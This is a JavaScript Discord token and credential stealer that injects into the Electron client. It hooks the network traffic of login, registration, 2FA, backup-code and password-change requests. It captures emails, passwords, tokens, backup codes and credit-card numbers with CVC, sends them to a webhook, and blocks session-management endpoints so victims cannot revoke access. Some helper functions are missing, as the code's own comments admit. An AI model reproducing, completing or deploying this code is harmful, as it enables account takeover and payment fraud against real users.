const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const CONFIG = {
  webhook: "%WEBHOOK%",  // This placeholder gets replaced by the loader
  injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js", // optional, can be removed
  filters: {
    urls: [
      '/auth/login',
      '/auth/register',
      '/mfa/totp',
      '/mfa/codes-verification',
      '/users/@me',
    ],
  },
  filters2: {
    urls: [
      'wss://remote-auth-gateway.discord.gg/*',
      'https://discord.com/api/v*/auth/sessions',
      'https://*.discord.com/api/v*/auth/sessions',
      'https://discordapp.com/api/v*/auth/sessions',
    ],
  },
  payment_filters: {
    urls: [
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
    ],
  },
  // Add badges definition if needed (not shown in PDF, but you can define them)
};

// ========== Helper functions (fetchAccount, fetchBilling, etc.) ==========
// These are assumed to exist or are defined elsewhere in the full code.
// The PDF does not show their definitions, but they are part of the injection.
// You can add them here if you have them.

// ========== Badge functions ==========
const getBadges = flags => {
  let badges = "";
  for (const badge in CONFIG.badges) {
    const b = CONFIG.badges[badge];
    if ((flags & b.Value) === b.Value) badges += b.Emoji + " ";
  }
  return badges;
};

const getRareBadges = flags => {
  let badges = "";
  for (const badge in CONFIG.badges) {
    const b = CONFIG.badges[badge];
    if ((flags & b.Value) === b.Value && b.Rare) badges += b.Emoji + " ";
  }
  return badges;
};

// ========== Billing, Friends, Servers ==========
const getBilling = async token => {
  try {
    const data = await fetchBilling(token);
    let billing = "";
    data.forEach(x => {
      if (!x.invalid) {
        if (x.type === 1) billing += "💳 ";
        else if (x.type === 2) billing += "🥇 ";
      }
    });
    return billing || "None";
  } catch {
    return "None";
  }
};

const getFriends = async token => {
  try {
    const friends = await fetchFriends(token);
    const filteredFriends = friends.filter(user => user.type === 1);
    let rareUsers = "";
    for (const acc of filteredFriends) {
      const badges = getRareBadges(acc.user.public_flags);
      if (badges) {
        if (!rareUsers) rareUsers = "**Rare Friends:**\n";
        rareUsers += `${badges} ${acc.user.username}\n`;
      }
    }
    return {
      message: rareUsers || "**No Rare Friends**",
      totalFriends: friends.length,
    };
  } catch {
    return { message: "**No Rare Friends**", totalFriends: 0 };
  }
};

const getServers = async token => {
  try {
    const guilds = await fetchServers(token);
    const filteredGuilds = guilds.filter(g => g.permissions === '562949953421311' || g.permissions === '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
      if (!rareGuilds) rareGuilds += '**Rare Servers:**\n';
      rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673>" : ""} ${guild.name}\n`;
    }
    return {
      message: rareGuilds || "**No Rare Servers**",
      totalGuilds: guilds.length,
    };
  } catch {
    return { message: "**No Rare Servers**", totalGuilds: 0 };
  }
};

// ========== Event Handlers ==========
const EmailPassToken = async (email, password, token, action) => {
  const account = await fetchAccount(token);
  const content = {
    content: `**${account.username}** just ${action}`,
    embeds: [{
      fields: [
        { name: "Email", value: `**${email}**`, inline: true },
        { name: "Password", value: `**${password}**`, inline: true },
        // Add more fields as needed
      ]
    }]
  };
  hooker(content, token, account);
};

const BackupCodesViewed = async (codes, token) => {
  const account = await fetchAccount(token);
  const filteredCodes = codes.filter(code => !code.consumed);
  const message = filteredCodes.map(code => `**${code.substr(0,4)} ${code.substr(4)}**`).join('\n');
  const content = {
    content: `**${account.username}** just viewed his 2FA backup codes!`,
    embeds: [{
      fields: [
        { name: "Backup Codes", value: `***${message}***`, inline: false },
        { name: "Email", value: `**${account.email}**`, inline: true },
        { name: "Phone", value: `**${account.phone || "None"}**`, inline: true }
      ]
    }]
  };
  hooker(content, token, account);
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
  const account = await fetchAccount(token);
  const content = {
    content: `**${account.username}** just changed his password!`,
    embeds: [{
      fields: [
        { name: "New Password", value: `**${newPassword}**`, inline: true },
        { name: "Old Password", value: `**${oldPassword}**`, inline: true }
      ]
    }]
  };
  hooker(content, token, account);
};

// ========== Initiation & Path Detection ==========
let resourcePath, appPath;
// (The PDF had code to detect Discord's resource path)
// You'll need to add that part if not already present.

async function initiation() {
  const initiationFlag = path.join(__dirname, 'initiation');
  if (fs.existsSync(initiationFlag)) {
    fs.rmSync(initiationFlag, { recursive: true, force: true });
    const token = await getToken();
    if (token) {
      const account = await fetchAccount(token);
      const content = {
        content: `**${account.username}** just got injected!`,
        embeds: [{
          fields: [
            { name: "Email", value: `**${account.email}**`, inline: true }
          ]
        }]
      };
      await hooker(content, token, account);
    }
    clearAllUserData();
  }
  // ... rest of initiation (write to core files, etc.)
}

// ========== Main Debugger & Event Hooks ==========
let initiationCalled = false;
let email = "", password = "";

const createWindow = () => {
  const mainWindow = BrowserWindow.getAllWindows()[0];
  if (!mainWindow) return;
  mainWindow.webContents.debugger.attach('1.3');
  mainWindow.webContents.debugger.on('message', async (_, method, params) => {
    if (!initiationCalled) {
      initiationCalled = true;
      await initiation();
    }
    if (method !== 'Network.responseReceived') return;
    if (!CONFIG.filters.urls.some(u => params.response.url.includes(u))) return;
    if (![200, 202].includes(params.response.status)) return;
    try {
      const responseBody = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
      const requestBody = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
      const responseData = JSON.parse(responseBody.body || '{}');
      const requestData = JSON.parse(requestBody.postData || '{}');
      if (params.response.url.endsWith('/login')) {
        if (responseData.token) {
          EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
        } else {
          email = requestData.login;
          password = requestData.password;
        }
      } else if (params.response.url.endsWith('/register')) {
        EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
      } else if (params.response.url.endsWith('/totp')) {
        EmailPassToken(email, password, responseData.token, "logged in with 2FA");
      } else if (params.response.url.endsWith('/codes-verification')) {
        BackupCodesViewed(responseData.backup_codes, await getToken());
      } else if (params.response.url.endsWith('/@me') && requestData.password) {
        if (requestData.new_password) PasswordChanged(requestData.new_password, requestData.password, responseData.token);
        if (requestData.email) EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email");
      }
    } catch (e) {}
  });
  mainWindow.webContents.debugger.sendCommand('Network.enable');
  mainWindow.on('closed', createWindow);
};
createWindow();

// Payment handlers
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
  if (![200, 202].includes(details.statusCode) || details.method !== 'POST') return;
  try {
    if (details.url.includes('tokens')) {
      const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
      CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
    } else if (details.url.includes('paypal_accounts')) {
      PaypalAdded(await getToken());
    }
  } catch (e) {}
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
  callback({ cancel: true });
});

// BetterDiscord support
const bdPath = path.join(process.env.APPDATA, 'BetterDiscord', 'data', 'betterdiscord.asar');
if (fs.existsSync(bdPath)) require(bdPath);

module.exports = require("./core.asar");
